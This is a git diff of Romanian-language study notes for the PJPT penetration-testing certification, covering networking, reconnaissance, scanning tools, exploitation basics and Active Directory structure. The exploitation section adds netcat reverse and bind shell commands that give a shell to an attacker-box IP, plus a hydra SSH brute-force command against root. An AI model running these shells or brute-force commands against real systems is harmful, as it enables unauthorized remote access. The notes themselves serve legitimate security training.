@@ -1,5 +1,5 @@
-# PJPT()
-descriere pe scurt 2 zile lab + 2 zile raport 2 incercari
+# PJPT(Practical Junior Penetration Tester)
+certificare practică oferită de TCM Security care testează abilitățile de bază în ethical hacking (enumerare, exploatare, privilege escalation și raportare), ideală pentru începători în domeniul pentesting-ului.Durată este 48 ore pentru laborator + 48 ore pentru raport.
 
 ## Coursuri recomandate:
 1. Practical Ethical Hacking - The complete Course
@@ -49,31 +49,30 @@ Three-Way Handshake este procesul folosit de TCP pentru a stabili o conexiune î
 ```wireshark filtre
 tcp.flags.syn == 1 or tcp.flags.ack == 1
 ```
-#TODO
+
+![README-2025-11-12-14-25-10.png](../src/img/README-2025-11-12-14-25-10.png)
 
 ### Common Ports and Protocols:
 | Protocol / Serviciu | Descriere | Port | Tip Transport |
 |--------------------|-----------|------|----------------|
-| FTP | File Transfer Protocol | 21 | TCP |
-| SSH | Secure Shell | 22 | TCP |
+| [FTP](Enumerating%20FTP.md) | File Transfer Protocol | 21 | TCP |
+| [SSH](Enumerating%20SSH.md) | Secure Shell | 22 | TCP |
 | Telnet | Remote Terminal Access | 23 | TCP |
 | SMTP | Simple Mail Transfer Protocol | 25 | TCP |
 | DNS | Domain Name System | 53 | TCP / UDP |
-| HTTP | Hypertext Transfer Protocol | 80 | TCP |
-| HTTPS | Hypertext Transfer Protocol Secure | 443 | TCP |
+| [HTTP](Enumerating%20HTTP_HTTPS.md) | Hypertext Transfer Protocol | 80 | TCP |
+| [HTTPS](Enumerating%20HTTP_HTTPS.md) | Hypertext Transfer Protocol Secure | 443 | TCP |
 | DHCP | Dynamic Host Configuration Protocol | 67 (Server), 68 (Client) | UDP |
 | POP3 | Post Office Protocol v3 | 110 | TCP |
 | IMAP | Internet Message Access Protocol | 143 | TCP |
 | SNMP | Simple Network Management Protocol | 161 | UDP |
 | NTP | Network Time Protocol | 123 | UDP |
-| SMB | Server Message Block | 445 | TCP |
+| [SMB](Enumerating%20SMB.md) | Server Message Block | 445 | TCP |
 | TFTP | Trivial File Transfer Protocol | 69 | UDP |
 | FTPS | FTP Secure (SSL/TLS) | 990 | TCP |
 | LDAP | Lightweight Directory Access Protocol | 389 | TCP / UDP |
 | MySQL | MySQL Database Service | 3306 | TCP |
 | RDP | Remote Desktop Protocol | 3389 | TCP |
-#TODO referinta la fiecare protocol scanarea lui si comenzi din linux 
-
 
 ### OSI Model:
 Modelul OSI (Open Systems Interconnection)
@@ -165,12 +164,6 @@ Mai multe exemple:
 ## Setting Up Our Lab:
 Aici putem instala 2 produse de virtualizare VirtualBox/VMware. VMware deja este instalat si configuralt pe sistem de accea accesta o sa fie folosit pentru a ridica laboratoarele. 
 
-## Linux:
-#TODO https://academy.tcm-sec.com/p/linux-fundamentals
-
-## Python:
-#TODO https://academy.tcm-sec.com/p/programming-100-fundamentals
-
 ## The Five Stages of Ethical Hacking:
 Etapele hacking-ului etic
 
@@ -188,9 +181,8 @@ Instalează mecanisme de persistență (backdoor, reverse shell, conturi ascunse
 
 5. Covering Tracks (Acoperirea urmelor)
 Șterge sau modifică dovezile activității (loguri, fișiere temporare), restabilește sau ascunde schimbările pentru a evalua detectabilitatea și capacitatea de răspuns.
-![README-2025-11-10-14-20-19.png](../src/img/README-2025-11-10-14-20-19.png)
-#TODO - Trebuie sal fac in obsidian diagrams sa arate mai bine 
 
+![README-2025-11-12-14-58-28.png](../src/img/README-2025-11-12-14-58-28.png)
 
 ## Information Gathering(Reconnaissance):
 ### Passive Reconnaissance Overview:
@@ -265,8 +257,6 @@ amass enum -d tesla.com
 - whatweb (CLI) - scanner CLI care detectează servere, CMS-uri, plugin-uri și metadate din pagini web; mai „agresiv” și customizabil prin pluginuri, util pentru fingerprinting web
 
 ### Information Gathering with Burp Suite:
-#### Burp Suite:
-#TODO scan with burp suite or maybe not aici putem sa scoatem informatie despre web site:)
 #### Google Fu:
 Unele exemple:
 ```
@@ -280,8 +270,6 @@ Este un resurs unde sunt strinse metodele de a gasi informatia: https://github.c
 
 Alta resursa pentru **Google FU**: https://tryhackme.com/resources/blog/google-fu
 
-#TODO OSINT course
-
 ## Scanning & Enumeration:
 ### Port scans:
 Aici o sa avem nevoie de **Kioptrix** in cazul meu o sa fie pe VMware:
@@ -290,7 +278,7 @@ Kioptrix Download: https://tcm-sec.com/kioptrix
 
 Sau daca vrem toate versiunele: https://www.vulnhub.com/series/kioptrix,8/
 
-Parcurgerea acestei masine o sa fie descrisa detaliata aici [Kioptrix Walkthrough](Kioptrix_Walkthrough.md) mai departe o sa fie doar unele comenzi/utilite utile.
+Parcurgerea acestei masine o sa fie descrisa detaliata aici [Kioptrix Walkthrough](/PJPT%20Certificate/Walkthrough%20/Kioptrix_Walkthrough.md) mai departe o sa fie doar unele comenzi/utilite utile.
 
 `netdiscove`        - scanează pasiv sau activ rețeaua specificată (de exemplu 192.168.1.0/24) pentru a identifica dispozitivele conectate și afișează adresele lor IP, MAC și producătorul plăcii de rețea. `-r` - pentru range
 ```bash
@@ -329,6 +317,11 @@ nikto -h http://<IP>
 
 `dirseach`          - scanner Python pentru directoare/fișiere web, recursiv, suportă extensii multiple şi output detaliat. 
 
+Exemplu:
+```bash
+dirsearch -u http://192.168.1.24/ -r -x 403 # -r  recursive -x - exlude code 
+```
+
 ### Enumerating SMB:
 Metasploit (exemple de bază):
 ```bash
@@ -345,6 +338,7 @@ exploit
 ```
 
 Listare share-uri, users, versiuni, politici, ACL-uri.
+
 `smbclient`       - client SMB (listare share-uri, conectare anonimă).
 ```bash
 smbclient -L //<IP> -N                          # -N = fără parolă
@@ -368,7 +362,182 @@ telnet <IP> 22
 In sectiunea data avem 2 instrumente principale pentru a exploata vulnerabilitatile gasite:
 
 [`rapid7`](https://www.rapid7.com/)         - companie şi platformă (ex: Metasploit, InsightVM) care oferă unelte comerciale şi baze de date pentru scanare, exploatare şi gestiunea vulnerabilităţilor.
+
 [`exploit-db`](https://www.exploit-db.com/) - arhivă gratuită cu exploit-uri şi PoC-uri publice; utilă pentru a căuta exploituri existente pentru o vulnerabilitate identificată.
 
+`searchsploit`                              -  
 
 ## Scanning with Nessus: 
+1. Descarc Nessus de pe site-ul oficial: [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true) 
+2. Instalez pachetul (exemplu pentru Debian/Ubuntu .deb): `sudo dpkg -i Nessus_packet_here.deb`
+3. Pornesc serviciul Nessus și mă asigur că este activ:
+```bash
+sudo systemctl enable --now nessusd
+sudo systemctl status nessusd
+```
+4. Deschid interfața web în browser la: https://<IP>:8834/
+
+### Run scan:
+#TODO screen la rezultatul scanari 
+
+## Exploitation Basics:
+### Reverse Shell vs Bind Shells:
+`Reverse Shell`         - este cel mai raspandit tip de shell atunci cănd victima dorește să se conecteze la mașina noastra este un tip simplu de shell.
+```bash
+Attackbox: nc -lvp 4444
+Target:    nc <IP_attack_box> 4444 -e /bin/bash
+```
+
+![README-2025-11-12-15-32-00.png](../src/img/README-2025-11-12-15-32-00.png)
+
+`Bind Shell`            - este procesul invers atunci cănd atacatorul se conectează la victimă.
+```bash
+Attackbox: nc 192.168.1.2 4444
+Target:    nc -lvp -e 4444 -e /bin/bash
+```
+
+![README-2025-11-12-15-34-06.png](../src/img/README-2025-11-12-15-34-06.png)
+
+### Staged vs Non-Staged Payloads:
+Non-Staged:  tot payload-ul este trasmis de odata(poate fii ușor depistat de programele antimalware) nu lucrează mereu de obicei este mai multe date(biți) de transferat.
+```bash
+- Trimite shellcode-ul exploitului tot dintr-o dată
+- Mai mare ca dimensiune și nu funcționează întotdeauna
+- Exemplu: windows/meterpreter_reverse_tcp
+```
+
+Staged: payload-ul se transmite treptat poate fii mai instabil.
+```bash
+- Trimite payload-ul în etape
+- Poate fi mai puțin stabil
+- Exemplu: windows/meterpreter/reverse_tcp
+``` 
+
+### Root with Metasploit:
+#TODO exploit samba cu versiuen gasita anterior
+
+
+### Manual Exploitation:
+#TODO de gasit exploiturile pe net-github 
+
+### Brute force:
+În cazul meu o să foloses `hydra`:
+```bash
+hydra -l root -P <password_list> -t 4 -V ssh://192.168.64.131:22
+#metasploit 
+search ssh 
+```
+
+## New Capstone:
+Masinele vulnerabile se pot scoate aici: https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1
+Pentesting for n00bs:                    https://www.youtube.com/watch?v=3aASluoJ-iM&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB
+
+#### Walkthrough list:
+- [Kioptrix](/PJPT%20Certificate/Walkthrough%20/Kioptrix_Walkthrough.md)
+- [Blue Windows](/PJPT%20Certificate/Walkthrough%20/Blue_Walkthrough.md)
+- [Academy](/PJPT%20Certificate/Walkthrough%20/Academy_Walkthrough.md)
+- [Dev](/PJPT%20Certificate/Walkthrough%20/Dev_Walkthrough.md)
+- [Butler](/PJPT%20Certificate/Walkthrough%20/Butler_Walkthrough.md)
+- [Blackpearl](/PJPT%20Certificate/Walkthrough%20/Blackpearl_Walkthrough.md)
+#TODO aici o sa fie cum a fost rezolvat din curs deja in fisierul curent cum a fost rezolvata de mine 
+
+##  Active Directory Overview:
+Active Directory:
+
+Serviciu de directoare dezvoltat de Microsoft pentru gestionarea rețelelor de domeniu Windows. stochează informații despre obiecte (computere, utilizatori, imprimante, grupuri etc.). gândește-te la el ca la o carte de telefon pentru mediul Windows.Autentifică utilizatorii folosind bilete Kerberos. Dispozitive non-Windows (de ex. maşini Linux, firewall-uri etc.) pot de asemenea să se autentifice în Active Directory prin RADIUS sau LDAP.Obiectele (users, computers, groups) au atribute care pot fi căutate/gestionate prin LDAP. Kerberos oferă autentificare securizată; dacă vezi Kerberos în loguri, înseamnă că procesul de autentificare e tipic AD. Dacă integrezi echipamente non-Windows, verifică suportul pentru LDAP/RADIUS și mapping-ul atributelor (ex: uid ↔ sAMAccountName).
+
+Pentru inceput trebuie de inteles ca Active Directory permite implementarea si sitemelor non-Windows cu `Kerborius` print `LDAP` sau `Radius`
+
+### Physical Active Directory Components:
+- **Data store**                        - conține fișierul NTDS.dit, baza de date principală a Active Directory. Important deoarece păstrează toate informațiile despre utilizatori, grupuri, parole hash-uite, și obiectele din domeniu.
+- **Domain Controllers(DC)**            - servere care stochează și gestionează copia bazei AD și procesează autentificările utilizatorilor.
+- **Global catalog server**             - server special care conține o copie parțială a tuturor obiectelor din forest; permite căutări rapide între domenii.
+- **Read-Only Domain COntroller(RODC)** - versiune de DC care oferă doar citire; utilizat în locații nesigure (nu poți modifica obiectele AD local).
+### Logical Active Directory Components: 
+- **Partitions**                        - segmente logice din baza de date AD (Schema, Configuration, Domain, Application). separă tipuri diferite de date pentru replicare mai eficientă.
+- **Schema**                            - definește structura și atributele obiectelor (ex: user are sAMAccountName, mail, etc.). este ca un "model de date" pentru tot AD-ul.
+
+Schema AD DS
+- Definește fiecare tip de obiect care poate fi stocat în director.
+- Impune reguli privind crearea și configurarea obiectelor.
+
+| Tip obiect (Object Types)             | Funcţie (Function)                         | Exemple (Examples)                         |
+| ------------------------------------- | ------------------------------------------ | ------------------------------------------ |
+| **Obiect de clasă (Class Object)**    | Ce obiecte pot fi create în director       | Utilizator (User), Calculator (Computer)   |
+| **Obiect atribut (Attribute Object)** | Informații care pot fi atașate unui obiect | Nume afișat (Display name), email, telefon |
+
+- **Domains**                           - unități administrative principale care conțin obiecte (utilizatori, calculatoare, grupuri). fiecare are propria bază de date și politici de securitate. 
+
+| Funcție                                    | Descriere                                                                                          |
+| ------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| **Graniță administrativă**                 | Permite aplicarea politicilor (Group Policies) asupra grupurilor de obiecte.                       |
+| **Graniță de replicare**                   | Controlează replicarea datelor între controlerele de domeniu (Domain Controllers).                 |
+| **Graniță de autentificare și autorizare** | Definește limitele pentru accesul la resurse – determină cine se poate conecta și la ce are acces. |
+
+Exemplu:
+contoso.com — un domeniu tipic Active Directory care conține utilizatori, calculatoare și politici specifice companiei.
+
+- **Domain trees**                      - grupuri de domenii conectate printr-o relație ierarhică (parent/child). domeniile din același tree împart același namespace DNS.
+
+| Caracteristică                                   | Descriere                                                                                                                                        |
+| ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **Spațiu de nume comun (namespace)**             | Domeniile din același arbore împart un namespace continuu cu domeniul părinte (ex: `emea.contoso.com`, `na.contoso.com`).                        |
+| **Domenii copil (child domains)**                | Fiecare domeniu poate avea propriile subdomenii.                                                                                                 |
+| **Trusturi transitive bidirecționale implicite** | Domeniile din același arbore creează automat relații de încredere bidirecționale (two-way transitive trust), permițând autentificarea între ele. |
+
+Exemplu:
+```bash
+contoso.com
+ ├── emea.contoso.com
+ └── na.contoso.com
+```
+- **Forests**                           - colecții de unul sau mai multe domain trees care împart aceeași schemă și catalog global.
+
+| Caracteristică                            | Descriere                                                                                        |
+| ----------------------------------------- | ------------------------------------------------------------------------------------------------ |
+| **Schemă comună (Common schema)**         | Toate domeniile din pădure folosesc aceeași definiție a obiectelor (schema AD).                  |
+| **Partiție de configurare comună**        | Informațiile de configurare (ex: site-uri, servicii, replicare) sunt partajate între domenii.    |
+| **Catalog global comun (Global Catalog)** | Permite căutarea obiectelor din toate domeniile din pădure.                                      |
+| **Trusturi implicite între domenii**      | Toate domeniile din pădure au relații de încredere automate, permițând autentificarea între ele. |
+| **Grupuri administrative comune**         | Grupurile „Enterprise Admins” și „Schema Admins” sunt comune pentru întreaga pădure.             |
+
+Exemplu vizual:
+```bash
+🌳 Forest
+ ├── contoso.com
+ │    ├── emea.contoso.com
+ │    └── na.contoso.com
+ └── fabrikam.com
+      └── eu.fabrikam.com
+```
+O „forest” reprezintă nivelul cel mai înalt de organizare în Active Directory — toate domeniile și arborii dintr-o pădure împart aceeași schemă, configurare și catalog global, fiind conectate prin trusturi implicite.
+- **Sites**                             - grupuri de subneturi IP folosite pentru a controla replicarea AD și autentificarea utilizatorilor local. optimizează traficul de rețea între locații fizice diferite.
+
+- **Organization units (OUs)**          - containere logice pentru organizarea obiectelor (ex: departamente). permit aplicarea de Group Policy și delegarea administrării.
+
+| Funcție                                                  | Descriere                                                                                                 |
+| -------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
+| **Reprezenta organizația într-un mod ierarhic și logic** | Structura ierarhică reflectă departamentele, birourile sau echipele reale din companie.                   |
+| **Gestiona colectiv obiectele într-un mod coerent**      | Permite aplicarea acelorași politici asupra unui grup de obiecte similare (ex: toți utilizatorii din IT). |
+| **Delega permisiuni de administrare**                    | Administratorii pot acorda drepturi de gestionare doar pentru o anumită unitate organizațională.          |
+| **Aplica politici (Group Policies)**                     | Permite aplicarea GPO-urilor doar asupra obiectelor din OU-ul respectiv.                                  |
+
+- **trusts**                            - relații între domenii/forests care permit autentificarea și accesul între ele. gândite ca o „încredere” între două domenii – un user dintr-un domeniu poate accesa resurse în altul.
+
+- **Objects**                           -  Toate aceste obiecte sunt stocate și gestionate în baza de date Active Directory și pot fi organizate în OUs (Organizational Units) pentru o administrare mai eficientă.
+
+Obiecte în Active Directory:
+| Obiect                                 | Descriere                                                                                                   |
+| -------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
+| **User (Utilizator)**                  | Permite accesul utilizatorului la resursele din rețea.                                                      |
+| **InetOrgPerson**                      | Similar cu un cont de utilizator; folosit pentru compatibilitate cu alte servicii de directoare (ex: LDAP). |
+| **Contacts (Contacte)**                | Folosit în principal pentru a atribui adrese de e-mail utilizatorilor externi. <br>Nu oferă acces la rețea. |
+| **Groups (Grupuri)**                   | Simplifică administrarea controlului de acces prin gruparea utilizatorilor.                                 |
+| **Computers (Calculatoare)**           | Permite autentificarea și auditarea accesului calculatoarelor la resurse.                                   |
+| **Printers (Imprimante)**              | Facilitează localizarea și conectarea la imprimantele din rețea.                                            |
+| **Shared Folders (Foldere partajate)** | Permite utilizatorilor să caute foldere partajate pe baza proprietăților definite.                          |
+
+##  Active Directory Lab Build:
+#TODO aici am ramas
+
+
